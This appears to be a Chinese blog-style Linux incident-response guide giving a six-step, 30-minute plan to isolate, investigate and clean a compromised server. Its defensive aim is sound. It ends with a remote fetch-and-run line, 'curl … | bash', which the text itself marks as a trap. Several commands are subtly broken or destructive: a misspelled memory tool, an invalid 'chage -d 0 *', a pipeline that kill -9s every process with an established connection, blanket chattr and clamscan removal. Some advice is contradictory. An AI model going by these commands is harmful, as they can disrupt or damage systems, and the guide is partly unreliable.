
---

🔥 **Linux系统被入侵后的黄金30分钟：6步绝地反杀 | 生死时速版** 
 
💀 _"黑客在我的服务器里蹦迪？先切断电源还是拔出网线？不，这才是正确解法！"_  

---

### **⚠️ 行动原则**  
1. **首要任务**：阻止攻击扩散，而非立刻反击  
2. **绝对禁忌**：不要关机/重启（会丢失内存证据）  
3. **记录所有操作**：打开终端立即执行 `script /var/log/incident_response.log`  

--- 

#### **第1步：切断连接（0-3分钟）**  
```bash  
# 暴力断网法（物理隔离首选）  
sudo ifconfig eth0 down                    # 关闭网卡  
# 或优雅封锁  
sudo iptables -A INPUT -j DROP             # 屏蔽所有入站  
sudo iptables -A OUTPUT -j DROP            # 禁止外连（阻隔C2通信）  
```  
**关键操作**：  
- 拔掉网线 > 防火墙规则 > 关闭SSHD服务（优先级排序）  
- **存活技巧**：本地保留一个未公开的SSH隧道用于应急  

---

#### **第2步：冻结现场（3-8分钟）**  
**🛡️ 保存系统瞬时状态**：  
```bash  
# 内存取证工具（需提前安装）  
sudo apt install volatility3 -y  
sudo liime-acquire -d /mnt/usb/            # 导出内存镜像到U盘  

# 快速进程快照  
ps auxef > /mnt/usb/process_snapshot.txt  
netstat -tulnp > /mnt/usb/network_conn.txt  
```  
**必存证据清单**：  
```
├── /var/log/*                         # 完整日志  
├── ~/.bash_history                    # 用户操作记录  
├── /proc/$PID/exe → /mnt/usb/         # 恶意进程二进制  
└── crontab -l                         # 定时任务备份  
```  

--- 

#### **第3步：关门打狗（8-15分钟）**  
**🕵️ 锁定攻击入口**：  
1. **查异常账户**：  
   ```bash  
   grep ':0' /etc/passwd                  # 检测伪装root用户  
   awk -F: '($3 == 0) {print}' /etc/passwd  
   ```  

2. **杀恶意进程**：  
   ```bash  
   # 找出反弹Shell进程  
   netstat -antp | grep ESTABLISHED | awk '{print $7}' | cut -d/ -f1 | xargs kill -9  
   ```  

3. **封后门文件**：  
   ```bash  
   find / -name "*.sh" -mtime -1          # 查找24小时内新建的脚本  
   find / -perm -4000 -ls                 # 扫描异常SUID文件  
   ```  

---

#### **第4步：清理战场（15-22分钟）**   
1. **拆除定时炸弹**：  
   ```bash  
   # 检查所有用户的cron  
   cat /etc/cron* /var/spool/cron/crontabs/*  
   # 删除可疑任务  
   crontab -e -u {用户名}  
   ```  

2. **粉碎SSH后门**：  
   ```bash  
   # 检查authorized_keys  
   cat ~/.ssh/authorized_keys  
   # 检查ssh_config注入  
   grep -r "ProxyCommand" /etc/ssh/*  
   ```  

3. **根除启动项**：  
   ```bash  
   systemctl list-unit-files | grep enabled  
   ls -al /etc/rc.local /etc/init.d/  
   ```  

---

#### **第5步：系统消毒（22-28分钟）**  
```bash  
# 使用专业工具（需提前部署）  
sudo rkhunter --check --sk               # 扫描Rootkit  
sudo clamscan -r --remove /              # 全盘查杀病毒（慢但彻底）  

# 快刀方案  
sudo chattr +i /bin/* /sbin/* /usr/bin/* # 锁定关键目录不可修改  
```  
**针对性策略**：  
- **挖矿病毒**：`pkill -f xmrig` + 清理`/tmp/`和`/dev/shm`  
- **勒索软件**：立即断开所有存储设备  

---

#### **第6步：重塑防线（28-30分钟）**  
1. **密码大重置**：  
   ```bash  
   # 强制所有用户改密码  
   chage -d 0 *                              
   # 生成高强度SSH密钥  
   ssh-keygen -t ed25519 -a 100  
   ```  

2. **构建监控哨兵**：  
   ```bash  
   # 实时文件监控  
   sudo apt install auditd  
   sudo auditctl -w /etc/passwd -p war -k passwd_changes  
   # 网络流量警报  
   sudo tcpdump -i eth0 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' -nn -l  
   ```  

---

### **🔰 事后应急工具箱**  
| **分类**       | **推荐工具**                   | **作用**                         |  
|----------------|------------------------------|----------------------------------|  
| **内存取证**   | `LiME` `Volatility3`         | 提取进程/网络连接内存镜像          |  
| **日志分析**   | `LNX-Basic` `Logwatch`       | 快速定位异常登录/操作              |  
| **文件恢复**   | `testdisk` `extundelete`     | 抢救被删除的恶意文件               |  
| **网络复盘**   | `tcpdump` `Wireshark`        | 分析攻击流量特征                   |  

---

### **💥 血的教训：千万不能做的事**  
1. **别**直接修复漏洞（会惊动攻击者）  
2. **别**用被控服务器的命令做检查（可能被篡改）  
3. **别**立即打补丁（先留证据再修复）  

---

**🔥 终极秘籍**  
将这份指南打印并贴在服务器机房，或者保存为 `/root/.emergency_plan`，关键时刻执行：  
```bash  
curl -s https://example.com/emergency.sh | bash  
# （不！千万别这么干！这是个陷阱示例！）  
```